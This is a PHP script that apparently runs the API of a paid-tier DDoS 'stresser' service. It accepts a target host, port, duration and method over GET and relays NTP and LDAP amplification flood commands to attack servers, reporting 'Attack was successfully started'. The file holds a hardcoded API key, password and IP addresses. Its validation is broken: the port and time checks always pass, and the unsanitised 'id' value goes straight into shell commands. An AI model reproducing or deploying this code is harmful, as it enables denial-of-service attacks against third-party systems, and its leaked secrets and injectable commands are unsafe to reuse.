<?php
$config = [
    'keys' => ['f15be64fbd498ecb5d6fed696f36b086'], // api key
    'authorized_ips' => ['127.0.0.1', '141.95.55.0', '194.59.218.10', '88.224.98.78'], // whitelist ips
    'max_stress_time' => 360,
    'port' => 3162, // server listining port
    'password' => '5635239784' 
];
$servers = [
    'Classic' => [''],
    'VIP' => [''],
    'Free' => ['194.59.218.10']
];

$methods = [

    // Free Methods
    'NTP-FREE' => "screen -dmS {{ID}} ./ntp {{IP}} {{PORT}} ntp.list 3 -1 {{TIME}}",
    'LDAP-FREE' => "screen -dmS {{ID}} ./ldap {{IP}} {{PORT}} ldap.txt 2 -1 {{TIME}}",
    // Stop Methods
    'STOP' => "pkill -f {{ID}}",
    'stop' => "pkill -f {{ID}}"
];

function send($ip, $command, $port, $password) {
    $socket = stream_socket_client('tcp://'.$ip.':'.$port);
    stream_set_timeout($socket, 0);
    if ($socket) {
        //$sent = stream_socket_sendto($socket, $password.';'.$command);
        $sent = stream_socket_sendto($socket, $command);
        if ($sent > 0) {
            $server_response = fread($socket, 4096);
            return true;
        }
    }
    stream_socket_shutdown($socket, STREAM_SHUT_RDWR);
}
function limit($iterable, $limit) {
    foreach ($iterable as $key => $value) {
        if (!$limit--) break;
        yield $key => $value;
    }
}
function clientIP() {
    return ($ip=getenv('HTTP_CLIENT_IP' ))?$ip:( ($ip=getenv('HTTP_X_FORWARDED_FOR' ))?$ip:( ($ip=getenv('HTTP_X_FORWARDED' ))?$ip:( ($ip=getenv('HTTP_FORWARDED_FOR' ))?$ip:( ($ip=getenv('HTTP_FORWARDED' ))?$ip:( ($ip=getenv('REMOTE_ADDR' ))?$ip:false )))));
}
function valid_URL($url){
    return preg_match('%^(?:(?:https?|ftp)://)(?:\S+(?::\S*)?@|\d{1,3}(?:\.\d{1,3}){3}|(?:(?:[a-z\d\x{00a1}-\x{ffff}]+-?)*[a-z\d\x{00a1}-\x{ffff}]+)(?:\.(?:[a-z\d\x{00a1}-\x{ffff}]+-?)*[a-z\d\x{00a1}-\x{ffff}]+)*(?:\.[a-z\x{00a1}-\x{ffff}]{2,6}))(?::\d+)?(?:[^\s]*)?$%iu', $url);
}
//if(in_array(clientIP(), $config['authorized_ips']))
if($_SERVER['REQUEST_METHOD'] == 'GET') {
    if(1 == 1) {
        if(isset($_GET['key']) && isset($_GET['host']) && isset($_GET['port']) && isset($_GET['time']) && isset($_GET['method']) && isset($_GET['node'])) {
            if(in_array($_GET['key'], $config['keys'])) {
                $host = $_GET['host'];
                $port = $_GET['port'];
                $time = $_GET['time'];
                $method = $_GET['method'];
                $node = $_GET['node'];
                if(isset($_GET["bot"])) {
                    //$id = preg_replace('/\./', '', $host).$port;
                    $id = preg_replace("/[^A-Za-z0-9]/", '', $host).$port;
                } else {
                    if(isset($_GET["id"])) {
                        $id = $_GET['id'];
                    } else {
                        $id = null;
                    }
                }
                if(filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) || valid_URL($host)) {
                    if(is_numeric($port) && $port >= 1 || $port <= 65535) {
                        if(is_numeric($time) && $time >= 5 || $time <= $config['max_stress_time']) {
                            if(array_key_exists($method, $methods)) {
                                switch($node) {
                                    case 'VIP':
                                        foreach($servers['VIP'] as $k => $ip) {
                                            send($ip, str_replace(
                                                array('{{ID}}', '{{IP}}', '{{PORT}}', '{{TIME}}'),
                                                array($id, $host, $port, $time),
                                                $methods[$method]
                                            ), $config['port'], $config['password']);
                                        }
                                        $data = ['success' => true, 'message' => 'Attack was successfully '.(strtoupper($method) == 'STOP' ? 'stopped' : 'started')];
                                        break;
                                    case 'Classic':
                                        foreach($servers['Classic'] as $k => $ip) {
                                            send($ip, str_replace(
                                                array('{{ID}}', '{{IP}}', '{{PORT}}', '{{TIME}}'),
                                                array($id, $host, $port, $time),
                                                $methods[$method]
                                            ), $config['port'], $config['password']);
                                        }
                                        $data = ['success' => true, 'message' => 'Attack was successfully '.(strtoupper($method) == 'STOP' ? 'stopped' : 'started')];
                                        break;
                                    case 'Free':
                                        foreach($servers['Free'] as $k => $ip) {
                                            send($ip, str_replace(
                                                array('{{ID}}', '{{IP}}', '{{PORT}}', '{{TIME}}'),
                                                array($id, $host, $port, $time),
                                                $methods[$method]
                                            ), $config['port'], $config['password']);
                                        }
                                        $data = ['success' => true, 'message' => 'Attack was successfully '.(strtoupper($method) == 'STOP' ? 'stopped' : 'started')];
                                        break;
                                    default:
                                        $data = ['error' => true, 'message' => 'Invalid node'];
                                }
                            } else {
                                $data = ['error' => true, 'message' => 'Invalid method'];
                            }
                        } else {
                            $data = ['error' => true, 'message' => 'Invalid time'];
                        }
                    } else {
                        $data = ['error' => true, 'message' => 'Invalid port'];
                    }
                } else {
                    $data = ['error' => true, 'message' => 'Invalid host'];
                }
            } else {
                $data = ['error' => true, 'message' => 'Invalid key'];
            }
        } else {
            $data = ['error' => true, 'message' => 'Missing parameters'];
        }
    } else {
        $data = ['error' => true, 'message' => 'You are not authorized to access API'];
    }
} else {
    $data = ['error' => true, 'message' => 'Bad request'];
}
echo json_encode($data);
?>